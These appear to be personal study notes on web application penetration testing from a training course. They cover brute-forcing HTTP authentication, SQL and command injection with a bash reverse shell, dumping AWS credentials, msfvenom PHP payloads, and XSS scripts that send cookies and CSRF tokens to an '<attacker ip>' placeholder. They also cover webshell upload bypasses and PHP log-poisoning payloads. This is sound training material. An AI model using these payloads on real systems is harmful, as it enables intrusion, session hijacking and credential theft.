# Web Application pentesting

**Note:** All images used in here is own by pentester academy

## HTTP Basics
Able to use netcat(nc), curl to view websites.

    nc <url> <port number>
	GET / HTTP/(1.0 or 1.1)
	Host: <url>/<ip>
HTTP/1.1 allow multiple request in same tcp connection but not HTTP 1.0

If you are using HTTP/1.1 you can close the connection by adding at the end "Connection: close"
## HTTP Methods and Verb Tampering
| Methods | Uses |
|--|--|
| GET | Information Retrival |
|POST| Form submissions,data in message body |
|OPTIONS|List of all supported methods for URL(e.g POST, DELETE,etc)|
|HEAD|GET message header but not message body|
|TRACE|Echo Client request back for diagnostics|
|PUT|Store in URI|
|DELETE|Delete resources|
|..|https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods|

Not every web server have options enabled.

OPTIONS is good for enumeration.

    curl -X OPTIONS <ip> -v

X-Powered-By and Allow is important to note.
<br>
We can upload file if PUT is allowed

    curl <ip and dir> --upload-file <file name>

## HTTP status codes
![](Images/Capture19.PNG)
## WebDAV
Webdav is enable we can exploit it
- Web-based distributed Authoring and Versioning
- Set of Extensions for HTTP Protocol
- Allows users to manage and edit files on remote web server
- HTTP verbs supported
	- COPY,LOCK,MKCOL,MOVE,PROPFIND,PROPPATCH,UNCLOCK
## Testing with nmap and msfconsole(Metasploit)
**Metasploit**

    use auxiliary/scanner/http/options
    show options
    set RHOSTS to victim ip
    set RPORT to victim webserver port
    run
**Nmap**
list of nse scripts: https://nmap.org/nsedoc/

    nmap --script=http.methods.nse <victim ip> -n -p <port number>

### HTTP verb tampering
**Using Options to find out what verb is allowed**

    curl -X OPTIONS <ip> -v

**Apache .htaccess Misconfiguration**

Happen when admin limit request method using "Limit" keyword. This will mean any other request method will be valid and will not require any form of authentication/

## HTTP Response Codes

 - 1xx = Informational
 - 2xx = Request sucessful
 - 3xx = Redirects
 - 4xx = Client Request Errors e.g 401 Unauthorized
 - 5xx = Server side errors

 
**Authentication in HTTP**

 - Basic Authentication
 - Digest Authentication
 - Token Based Authentication

To see what authentication the webserver is using look at 
WWW-Authenticate header value.

**Basic Authentication**
 1. List item
2. Credentials of basic authentication is encoded in Base64.
3. Basic authentication allow mutiple retries

![](Images/Capture.PNG)

### Attacking HTTP Basic Authentication with Nmap and Metasploit

Able to use crunch to generate a wordlist.

    crunch <min word> <max words> <letters>

**Nmap**

    nmap -p 80 --script http-brute --script-args 'http-brute.hostname=<victim url/ip>, http-brute.method=<Http Method to use>,http-brute.path=<path>,userdb=<your username wordlist>,passdb=<password wordlist>' -n -v <url/ip>

**Metasploit**

    Search http_login
    use auxiliary/scanner/http/http_login
    show options(Configure the options first)
    run
### Attacking HTTP Basic Authentication with Hydra
Identify whether the authentication is basic or digest

    curl -I <ip>

In Digest Authentication, realm is like the user account. You cant other realm credential to access another realm credential.

After we identify the authentication, we perform the attach

    hydra -l <user name> -P <password file> <ip> http-get <dir>
    or
    hydra -l <user name> -P <password file> <ip> <service> <dir>

We can view the page with the credential depending if its basic or digest authentication

    Basic:
    curl -u <user>:<password>
    
	Digest:
	curl --digest -u <user>:<password>
### Attacking HTTP Basic Authentication with burp
There is the authorization with a base64 (e.g Authorization: Basic am9cbjpkb2U=).If you highlight the base64 and select Convert Selection > Base64 > Base64-decode, you can see the crendential send


1. First we send intercept the request and send it to intruder
2. go to intruder and click position
3. There is the authorization with a base64 (e.g Authorization: Basic am9cbjpkb2U=). Replace the base64 and input any text.
4. Highlight the text u input and click Add on the right hand side
5. go to payloads and edit the things necessary. If you know the username you can add a prefix and encode it with base64
6. When finish editing the payload click start attack

### Attacking HTTP Login Form with burp
1. First we send intercept the request and send it to intruder
2. go to intruder and click position
3. clear all selectors
4. select all login value selector
5. go to payloads and set the option( note: we can use "Payload set" to use different wordlist for different login field parameter
### HTTP Digest Authentication
Digest	Authentication sends a	Hash of the password instead of sending the password in plaintext

**RFC 2069**
 **Response calculation for digest authentication**
![](Images/Capture1.PNG)
![](Images/Capture2.PNG)
**RFC 2617**
1. Adds Client nonce to mitigate chosen plain-text attacks
2. Adds "QOP" - Quality of protection, auth for authentication and auth-int for authentication and integrity. Auth-int is rarely used and not well supported.
![](Images/Capture3.PNG)

## HTTP Statelessness and Cookies

**HTTP is Stateless**
1. Every request is treated independently.
2. Server does not retain state for clients.This means the server will not remember you.
3. Therefore,Every request need to be separately authenticated
4. Every request must carry auth information

**Implementing statefulness using cookies**
- Allows server to store and retrieve data from the client
- Typically stored in a file on the client side
- text only; no executable code
- Allows for retaining state with the Client's help(user preferences and session management)

**Setting cookie**
When a server want to set a cookie it uses "Set-Cookie"

**What information is in the cookie**
  ![](Images/Capture4.PNG)
  ![](Images/Capture5.PNG)
  Attributes in the cookie:
  1. Name
  Able to set any name and value < name > = < value >
  2. Expiry date
  - If expires not mention, it is a session cookie where once you close the browser the cookie will be deleted.
  - FORMAT:
  &nbsp;day,dd-mmm-yyyy HH:MM:SS GMT
  3. Domain
  Specify the cookie is valid for which website
  4. path
  Specify when the cookie is valid on which path on the website
  5. secure
 Add only ;secure to the cookie to allow the cookie to be used during https
 6. httponly
 this specify that cookie cannot be access by client side scripts

## Session ID

 - Unique identifier or token to identify a user and session

**Session id are stored in**

 - url
 - form-field
 - cookie
 - ...

**Ideal Session ID**
1. Long
2. Random
3. Name should not suggest functionality
4. should timeout and not be recycled
5. should not be derived using shared secrets e.g passwords, usernames
6. Sent over secure channel

## SSL - Transport layer protection

**HTTPS**

 - Transport layer protection, 
 - Use public cryptography creates a tunnel and send data through it

**Peer into HTTPS connection**
- have access to private key
- Man in the middle attack with self signed certificate
- SSLStrip force https to http

## File Extraction from HTTP Traffic

We can use TCPxtract to extract HTTP traffic data from HTTP stream. It is not installed by default in Kali.

https://linux.die.net/man/1/tcpxtract

## HTML Injection Basics
**Injection Attacks**

 - Frontend(Client)
1. Rendering Attacks => HTML injection
2. Code Execution => JS injection(XSS)
- Backend(Server)
1. Command Injection(e.g SQL injection etc.)

**HTML injection in Tag Parameters**
you can use quotation to escape from the tag and insert own html code. You can obfuscate the code in the url

**HTML injection using 3rd party data source**
Query your own website to inject your own code

**Bypass Filters Cgi.Escape**
CGI is like a filter to sanitizer user input to prevent command injection

Different web framework have different filters to sanitise any html in the field. We can use double quotation to escape the filter.

## Command injection
If we see shell_exec in the script it might be vulnerable to command injection
![](Images/Capture21.PNG)

 - Scripts which run commands on shell
 - user input is not sanitized
 - Multiple commands executed on exisiting one

Running multiple commands using semicolon.
< command > < args> ; < command >

**Command injection filter bypass**
| Filter |  |
|--|--|
| ; |  |
|&&||
|\||
|...||

**PHP api for escaping**
escapeshellcmd and escapeshellarg can be use to escape shell command. However, there is still possibility of executing arbitrary commands

### OS Command Injection - Blind
Steps:
1. Start a net cat listener
	-  		nc -lvnp <ip>
2. get a bash reverse shell and use bash -c wrapper. This call a bash shell from a sh shell
	- `;bash -c "<bash reverse shell>"`
### Command injection in container or lambda
We need to use ;printenv due to Temporary access crendentials

Note down the AWS_ACCESS_KEY_ID ,AWS_SESSION_TOKEN,AWS_SECRET_ACCESS_KEY. This the information to use the role or this is TAC. It has a time window and this credential will expire

https://docs.aws.amazon.com/AmazonS3/latest/userguide/VirtualHosting.html
Read the documentation

export AWS_ACCESS_KEY_ID ,AWS_SESSION_TOKEN,AWS_SECRET_ACCESS_KEY by copying the entire line and paste into ur bash.

    aws s3 <command> s3://<bucket name>
<br>

**Tools:**

https://github.com/RhinoSecurityLabs/pacu
**Usage of tool:**
We can use PACU to exploit lambda when we found AWS_ACCESS_KEY_ID ,AWS_SESSION_TOKEN,AWS_SECRET_ACCESS_KEY.

We need to run the command in the docker. If we want view the file we need use 

    docker exec -it <name of container> <command to execute or "sh">

To prevent this we need restrict the role to lowest privilege.

## SQL Injection
![](Images/Capture22.PNG)

### SQL injection for login form

    1' OR '1'='1';-- 
    or
    ' OR '1'='1' --
    or
    ' OR '1'='1' # 
Sometime we can use LIMIT to help gather data
![](Images/Capture23.PNG)

    <sql code> LIMIT <start offset>,<number of row>
 
 Sometimes no all sql injection need quotation marks for example, if its an id in the url we can use and use LIMIT
 

    1 OR 1=1

If URL have no parameter, we need use burpsuite to intercept the request and perform the sql injection. 
### DynamoDB PartiQL SQL injection
![](Images/Capture24.PNG)
### DyanomoDB NoSQL injection
Note: Type in dynamoDB is stand for the type of the value

We can find the different comparision in this link:
https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/LegacyConditionalParameters.ScanFilter.html

We can use comparsion GT and value * to get all value.

To perform this attack we need use burpsuite to intercept this request.

## XXE Attack
When server runs xml parse is poorly configured and the website is not checking for user input. A vulnerability will be created.

XXE can perform
1. reading files
2. Server side request forgery
3. data exfiltration via blind XXE attack
4. Retrieving data from error message from blind XXE attack

Payload example:
![](Images/Capture25.PNG)
![](Images/Capture26.PNG)
for the second image we can play with the uri ( which is file///) 
https://en.wikipedia.org/wiki/List_of_URI_schemes

## Web to Shell on the Server
Using command injection we can use wget to transfer our php shell from python server.

    cd <directory where your php shell at>
    python3 -m http.server
    <url><inject command "wget">
  

**PHP Meterpreter**

We can use msfvenom to generate a php payload

    msfvenom -p php/meterpreter/reverse_tcp LHOST=<your ip> LPORT=<your port number> -f raw > <output location/filename>

After creating the payload we need remove to hash tag at the start of the file

**Netcat reverse shell**

 - Scenario:
 1. no write access
 2. rely on utilities install on systems

netcat commands to take note:
1. Use -e to start a shell as it is used to start a file (some server dosen't support)
2. -l is used to listen for connection coming in
3. -p is used to specify the port to listen to

**Using Interpreters(e.g Python,bash,etc)**

Search for interpreters

    whereis <interpreter> (e.g python)

use reverse shellcode cheat sheet
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## XSS

 - Client side vulnerability
 - Insert javascript into webpage
 - Use to hijack session

    < script >alert("0")</ script >

**Types of XSS:**

 1. Persistent
 XSS payload is stored on the server side.
 2. Non-persistent
Reflected XSS
 3. DOM based

**XSS via Event Handler Attributes**
- Event handler make page interactive
- Requires user Interaction(e.g onmouseover,onclick)
- No user interaction required ( e.g onload , onerror)

https://developer.mozilla.org/en-US/docs/Web/Events

We can use event handler to replace script tag

E,g: onmouseover=alert("xss")

### DOM based XSS
Attack occurs due to modification of the DOM due to user input

if you see "eval(< object >)" it means it will run javascript 

### HTML DOM
Allows Javascript to add/modify/remove
- HTML elements
- HTML attributes
- CSS style
- HTML events

Examples:
 - Finding and Modifying Elements
	- getElementById()
	- getElementsByTagName()
- modify
	- .innerHTML= ""
- Take note of event
	- .addEventListener 

### Javascript 

**Event Handler**

Able to include event handler in javascript

    e.g
	document.getElementById(<id name>).onmouseover= function(event) { alert("onmouseover handler"); } ;
	or
	document.getElementById(<id name>).addEventListener("mouseover",function(event) { alert("onmouseover handler"); },false);
	
https://developer.mozilla.org/en-US/docs/Web/Events

**Cookies**

set cookie by using document.cookie

any subsequent document.cookie, the value of it will be appended.

https://developer.mozilla.org/en-US/docs/Web/API/document/cookie

**Error handling(Exceptions)**
- try-catch-finally


### Stealing cookies

**Common Methods:**
1. document.location ( intrusive )
2. < img src="..." />
3. < img src="..." / height="1" width="1">
4. new Image().src= "..."

**document.location**

will redirect user to attacker website with the cookie in the url. 

Can check server logs for cookie

**img src**
< img src="..." />

     document.write('<img src="<attacker ip>/?'  + document.cookie+ '"/>');

< img src="..." / height="1" width="1">

    document.write('<img height="1" width = "1" src="<attacker ip>/?'  + document.cookie+ '"/>');

new Image().src= "..."

    new Image().src ="<attacker ip>/?:+document.cookie;
### Advance Forms Manipulation
1. Intercepting a form submit
2. Reading /Modifying value in the form
3. Posting form to attacker server

Steps:
1. Ctreate a function(Return true to submit and return false to not submit)
2. < form id>.onsubmit = < function name>

**Finding placeholder value**

    document.forms["<form id>"]["<placeholder name>"].value
    
    or
    
    document.forms[0(first form)].elements[<number of the element>].value

**Editing the form placeholder value**

    document.forms[0(first form)].elements[<number of the element>].value = <value>

**Sending Placeholder value to attacker server**

    document.forms[0].action = "<attacker server ip>";

### XMLHttpRequest
Data govern by Origin policies:
 - Same origin policy
1. Resource sharing allowed only if from the same origin
2. Origin based on Protocol,Port and Host Combination
 - Cross origin resources sharing
1. Server decides based on origin domain

Essential code (The script need to be encoded with url for it to work)

    var req = new XMLHttpRequest();
	req.onreadystatechange = function () {
		if (req.readyState == 4 && req.status == 200){
			response_data= req.responseText;
			document.getElementById('result').innerHTML = response_data;
		}
	}
    req.open("<Method>","<URL location>",<Synchronous(true) or Asynchronous(false)>
    req.send()

**Synchronous and Asynchronous**
Synchronous will block all other script on the page while Asynchronous dosent

**Refrence:**
https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest

### XHR and HTML Parsing
This feature allows Web apps to obtain an HTML resource as a parsed DOM using XMLHttpRequest

**Why HTML parsing**
1. XSS can be used to traverse the application
2. HTML pages might need to be processed
3. DOM based parsing is required
**Limitation**
- HTML support is not available in the synchronous mode
- HTML support  is only available if the responseType property is set to document

**Example:**

    <script>

	var req = new XMLHttpRequest();

	req.onreadystatechange = function () {
		if (req.readyState == 4 && req.status == 200){
			var htmlPage = req.responseXML; (Turn html into XML)
			//Find tag
			links = htmlPage.getElementsByTagName("a"); 
			result=''
			for (i = 0; i < links.length;i++){
				result += links[i] + "</br>"
			}
			document.getElementById("result").innerHTML = result;
		}
	}
	req.open("GET","/lab/webapp/jfp/2",true);
	//Important: need specify doc type
	req.responseType = "document"; 
	req.send()
	</script>


https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/HTML_in_XMLHttpRequest

### XHR and JSON Parsing
**What is JSON?**	
 - JavaScript Object NotaCon		
 - text based data exchange		
 - human readable	
 - hierarchical data		
 - AJAX	applicaCons - alternate to XML	

**Why JSON Parsing**

 - XSS can be used to traverse the application
- Most modern web applicaCons use API based access 
- Response type is JSON in a large majority

**Example:**

    <script>
    
    var req = new XMLHttpRequest();
    
    req.onreadystatechange = function () {
    	if (req.readyState == 4 && req.status == 200){
	    	// used to work with JSON value
    		response_obj = JSON.parse(req.responseText);
    		alert(response_obj.vuln);
    	}
    }
    req.open("GET","/lab/webapp/jfp/json/data",true);
    req.send()
    </script>
### XHR and XML Parsing
You can query XML for certain tag like HTML parsing
**Example:**

    <script>

	var req = new XMLHttpRequest();

	req.onreadystatechange = function () {
		if (req.readyState == 4 && req.status == 200){
			titles = req.responseXML.getElementsByTagName("title");
			for(i = 0;i<titles.length;i++){
				// get value of the tag
				alert(titles[i].childNodes[0].nodeValue);
			}
		}
	}
	req.open("GET","/lab/webapp/jfp/xml/data",true);
	req.send()
	</script>

## File upload vulnerability
### Basics
- Attacker abuses a file upload feature to upload malicious script
- Script is executed and allows for further attacks

### Beating Content-Type Check in File Uploads
Using burpsuite we can change content type to bypass filter and upload our webshell or reverse shell.

### Bypassing Blacklists in File Upload
-   write our own .htaccess file with
 
  `AddType application/x-httpd-php PHP`
  
  for this to work apache must have "AllowOveride:" to set to "All" in etc/apache2/sites-available/default

### Bypassing Blacklists using PHPx
- Sometimes developer forgets to filter out php3/4/5. Therefore, we can use php3/4/5 as our shell extension to upload our webshell or reverse shell.

###  Bypassing Whitelists using Double Extensions in File Uploads

- If more than one extension is given which maps onto the same type of meta-information, then the one to the right will be used, except for languages and content encodings. For example, if .gif maps to the MIME-type image/gif and .html maps to the MIME-type text/html, then the file welcome.gif.html will be associated with the MIME-type text/html.
- Care should be taken when a file with multiple extensions gets associated with both a MIME-type and a handler. This will usually result in the request being by the module associated with the handler. For example, if the .imap extension is mapped to the handler imap-file (from mod_imap) and the .html extension is mapped to the MIME-type text/html, then the file world.imap.html will be associated with both the imap-file handler and text/ html MIME-type. When it is processed, the imap-file handler will be used, and so it will be treated as a mod_imap imagemap file.

Nano /etc/apache2/mods-available/php5.conf
![](Images/Capture6.PNG)

### Defeating Getimagesize() Checks in File Uploads

using "gifsicle --coment" to add php commands

if you want to put a shell in the comment u need to

    gifsicle --comment "` tr '\n' ' ' < *php file*`" < *gif file or image file* > *output file name*
    
    or
    
    tr '\n' ' ' < *php file*
    then copy the value into <here>
    gifsicle --comment '<here>' < *gif file or image file* > *output file name*

Condition for this to work:
- use getimagesize()
- double extension allowed

### Null Byte Injection in File Uploads
Does not require multiple extension support in php configuration.

Method:

- Intercept request with burp and add .php and A after php extension in between gif and name of file(e.g shell.phpA.gif)
- go to hex tab and find the hex where the A reside and replace 41 with 00

What this will do is will make the extension at the back become invalid.

## File Inclusion Vulnerability
### Remote File Inclusion Vulnerability
### Basics
Typical Vulnerable File
![](Images/Capture7.PNG)
Required PHP Configuration for RFI
File Path:/etc/php5/apache2/php.ini
![](Images/Capture8.PNG)
Steps:

1. run a python webserver with python webshell or reverse shell
2. in file parameter in the url include the webserver ip with the shell file name.
3. if using webshell change ? to & as it is a additional parameter
### Exploiting RFI with Forced Extensions

Typical Vulnerable File with Forced Extensions
![](Images/Capture9.PNG)
Methods:

1. append .html to the shell
2. put a question mark after php extension
3. use an anchor using %23

Beatingng forced extensions 
- Make the extension useless and append any of the following 
	- ? 
	- %23 (#) 
	- ?%26as= (?&as=) 
- Attacker can rename file to whatever extension is needed 
	- e.g. simple-backdoor.php.html 
### Local File inclusion
### Vulnerability
This is vulnerable to both RFI and LFI
![](Images/Capture10.PNG)

### Local file inclusion basic
we use lfi because allow_url_include is set to off

Methods:
1. using ../ we can move back one directory to access the files in that directory
2. type out file path or name (e.g /etc/passwd)

View source of the page might find something useful
### LFI with Directory Prepends
![](Images/Capture11.PNG)
When the vulnerable code start with the directory with can use the method **Path transversal**
Method:
Using ../ we can transverse the web directory to the file path we want.
### Remote Code Execution with LFI and File Upload Vulnerability
![](Images/Capture12.PNG)
Vulnerable code

<br>

Using the same method in file upload vulnerability where we embed a php script in the comment of the gif file or a picture file. We can then use lfi to view the image and add a parameter at the back if using webshell to execute commands.

### LFI with File Extension Appended - Null Byte Injection
![](Images/Capture13.PNG)
Method:
- using %00 at the back of the file name we can append a nul byte to bypass the set extension by the developer
### Remote Code Execution with LFI and Apache Log Poisoning
![](Images/Capture13.PNG)
![](Images/Capture14.PNG)
Requirements:
1. attcker can inject code to the log file
2. the log file can be read by apache server
3. there is a lfi vulnerability

Materials to read on:
https://security.stackexchange.com/questions/11098/how-can-log-poisoning-be-successful-with-a-local-file-inclusion-attack

Method:
1. Using user agent we paste our php code when we send our user agent

-     <?php echo system($_GET['cmd']); exit; ?>

2. using lfi we locate apache access log file and access it

### Remote Code Execution with LFI and SSH Log Poisoning

Requirements:
1. auth.log is readable by all 
2. Username field is logged!

Steps:

1. Use PHP code for username
-     '<?php echo system($_GET['cmd']); exit; ?>'@<ip>

2. Exploit LFI and get RCE

## Unvalidated Redirects
Redirects are necessary 
- Understanding user behavior 
	-  Exit links and frequency 
	-  Easy way to route visitors 
	- Can be external or internal links 
- Unvalidated Redirects 
	- Exploit the “trust” of links on a domain 
	- Phishing Attack with a trust component

Vulerability:
![](Images/Capture15.PNG)
If website uses a php file to redirect
### Encoding Redirect Params

Methods:
1. Using url encoder
2. ASCII to hex
3. encode ascii to hex 2 times
4. encode with both url and ascii to hex encoder

### Open Redirects: Base64 Encoded Params
Base64 Encode/Decode Params 
- Base64 Encoding very common 
- Always a good thing to try 
- Easy to beat and abuse

Vulnerable code:
![](Images/Capture16.PNG)
Website to use:
https://www.base64decode.org/
### Open Redirects: Beating Hash Checking
Hash Check
- Application creates hash of the URL
- Redirect URL contains both URL and Hash
- Hash is checked on the server side before redirecting

Tool:
there is a tool in scripts folder called hash.php that will get all hashes of the url in order to be used in the parameter of the url. 
### Open Redirects: Hashing with Salt
Hashing with Salt
- Crypto Salt can be prepended/appended to
the URL before hashing
- Salt can be
	- Static/Rotated and not transmitted
	- Random and part of the URL params

Methods to bypass:
If we know the salt and where the salt is place either preappend or appended. We can get the proper encoded hash with the salt using the tool salthash.php in the tools folder.

### Securing Open Redirects
Securing Redirects
- Avoid use if possible
- Validate them. If redirect URLs are
	- Known
		- Use indirect identifiers e.g. index in an array or an ID column in a database
	- Unknown e.g. Social Media sites
		- Generate URLs with Hashes using long random salts which are rotated
		- Encrypt URLs in links and only redirect if it successfully decrypts
		- Rotate Keys/Salts regularly


## Cross Site Request Forgery
### Basics
- Malicious website exploits trust between Browser and a Vulnerable Website the user is authenticated to
- Unauthorized commands are run on behalf of the user on the vulnerable website

### HTML tags uses to trigger CSRF
- `<img src=“XXXX” />`
- `<iframe src=“XXX” />`
- `<script src=“YYY” />`

### XMLHttpRequest Based Triggering
- Most handy if XSS is found on the Victim website
- Can still work from the Attackers Website with a favorable CORS Policy

Refer to XMLHttpRequest above to refer more about XMLHttpRequest

### CSRF Multi-Step Handling
- Operation might span multiple steps
	- E.g. A confirmation screen
- If no CSRF protection is used e.g. Tokens then this is easy to beat
- Multi-step operations with CSRF protections
	- XSS

We can craft a XMLHttpRequest payload to send with the additional params and perform GET POST

Examples:
Only GET GET

    <img src="<url>" onerror="document.getElementById('image2').src='<params after you click>'" width="1" height="1"/> <img id="image2" width="1" height="1"/>
  
 Only GET POST

    <script>
	var req1 = new XMLHttpRequest();
	req.onreadystatechange = function () {
		if (req1.readyState == 4 && req1.status == 200){
			var req2 = new XMLHttpRequest();
			req2.open("POST","<URL location>",false);
			req2.setRequestHeader("Content-type","application/x-www-form-urlencoded");
			req2.send("<param and params value>")
		}
	}
	req1.open("GET","<URL location>",false);
	req1.send();
	</script>

### Mitigating CSRF with Tokens
**What is the problem?**
- Cookie is sent automatically with requests
	- Attacker need not know the value of the cookie if attacker use a link to redirect to another website
- No other “session” or “operation” validation

**Solution to CSRF**
- Identify critical operations in the Application
	- Basically URLs / API endpoints
- Each critical operation request must be accompanied with a “token”
- Token is
	- Long, Random, not repeated for application lifetime
	- Unique per session or even per operation
	- Part of URL in GET
	- Hidden Field in POST (forms)
	- Attacker cannot know / predict this token and hence cannot create requests to exploit the operation

**User Interaction with Tokens**
![](Images/Capture17.PNG)
![](Images/Capture18.PNG)

**What could go wrong? Token Security**
- Is the token long enough?
- Is it random enough? Entropy?
	- Should not be derived from known / predictable data
- Never repeated or reused?
- Stored insecurely
	- GET requests in history files, server logs etc.
- Is sent over a secure medium? HTTPS?
	- Sniffing and MITM

### CSRF and XSS
If the website have a XSS vulnerability we can use this script and encode the script into html to use in the url

    <script>
    var uid = document.forms[0].elements[0].value;
    var token = document.forms[0].elements[1].value;
    var req = new XMLHttpRequest();
    
    req.open("POST","<url>",true);
    req.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    req.send("uid="+uid+"&csrf_token="+token);
    </script>
### CSRF Token Bypass with Hidden Iframes
Using iframes when user first enter your website it will run the XSS payload and encode this script into url to input in the iframe

    <script>
    var uid = document.forms[0].elements[0].value;
    var token = document.forms[0].elements[1].value;
    var req = new XMLHttpRequest();
    var req.onreadystatechange = function() {
    if (req.readyState == 4 && req.status == 200){
    	var req2 = new XMLHttpRequest();
    	req2.open("GET","http://<attacker ip>/response?resp="+req.responseText,true);
    	req2.send();
    }
    };
    req.open("POST","<victim website form url>",true);
    req.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    req.send("uid="+uid+"&csrf_token="+token);
    </script>
## Insecure Direct Object Reference
- Authorization problem
- Is an authorization check done when:
	- Files, Directories etc. are accessed on behalf of the user
	- User specific data is read from the database
- If a resource is accessed, then does the user have the authorization to do so?

## AWS Lambda

1. Is Serverless and run your code
2. highly scalable
3. pay for the usage
	- time taken
	- memory consumed
4. Supports throttling

When multiple connection it will bring up more container to support the connection

## S3 bucket enumeration
 
 Tools:
 [AWSBucketDump.py](https://github.com/jordanpotti/AWSBucketDump.git)
 https://buckets.grayhatwarfare.com/ (Paid)


## Directory enumeration

Tools:
Dirb

### Dirb
Usage:

    dirb <url> -X <file extentsion> -w -N <exclude status code> -w 

![](Images/Capture20.PNG)

## Shellshock

CGI is Common Gateway Interface.

CGI is use to execute custom script

if there is a cgi script it will be possible to exploit it.

We can use nmap script to detect shellshock vulnerability

Script name: http-shellshock

    nmap -sV -p- --script http-shellshock --script-args uri="<cgi location e.g (/cgi-bin/bin)> ,cmd=<command>" <target>

If Vulnerable it will show the CVE code. Copy the CVE code and search for the vulnerability. We need to navigate to the cgi script and execute it. We can  intercept the request when we enter the cgi script and throw it into the repeater

## Differentitate a VM and computer

Methods:
1. using ps -eaf

### ps -eaf
Computer PID start from 700 or 900 . However container start at a low number.

There will be thousand of process if its in a computer.
